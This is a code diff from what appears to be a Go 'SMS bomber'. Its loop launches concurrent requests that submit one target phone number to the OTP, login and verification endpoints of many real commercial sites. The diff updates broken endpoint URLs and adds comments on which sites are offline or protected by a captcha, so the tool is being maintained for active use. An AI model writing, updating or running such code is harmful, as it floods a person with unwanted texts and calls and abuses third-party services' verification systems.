@@ -110,26 +110,26 @@ func main() {
 	for i := 0; i < repeatCount; i++ {
 		go sms("https://3tex.io/api/1/users/validation/mobile", map[string]interface{}{
 			"receptorPhone": phone,
-		}, ch) //ofline site = error 504
+		}, ch)  //ofline site = error 504
 		go sms("https://deniizshop.com/api/v1/sessions/login_request", map[string]interface{}{
 			"mobile_phone": phone,
-		}, ch)
+		}, ch)  // error site = not registry
 		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
 			"userKey": phone,
-		}, ch)
+		}, ch)  //ofline site = not code
 		go sms("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", map[string]interface{}{
 			"cellphone": phone,
-		}, ch)
-		go sms("https://bck.behtarino.com/api/v1/users/phone_verification/", map[string]interface{}{
+		}, ch)  //ofline site = not code
+		go sms("https://bck.behtarino.com/api/v1/users/jwt_phone_verification/", map[string]interface{}{
 			"phone": phone,
-		}, ch)
-		go sms("https://abantether.com/users/register/phone/send/", map[string]interface{}{
+		}, ch)  // edit :4/22/2025
+		go sms("https://api.abantether.com/api/v2/auths/register/phone/send", map[string]interface{}{
 			"phoneNumber": phone,
-		}, ch)
+		}, ch)  // edit :4/22/2025
 		s57 := fmt.Sprintf("phone=%s&call=yes", phone)
 		go sms("https://novinbook.com/index.php?route=account/phone", map[string]interface{}{
 			s57: phone,
-		}, ch)
+		}, ch) // verify site: i'm not robot
 		go sms(fmt.Sprintf("https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber=%s", phone), map[string]interface{}{
 			"monsmain": "monsmain",
 		}, ch)
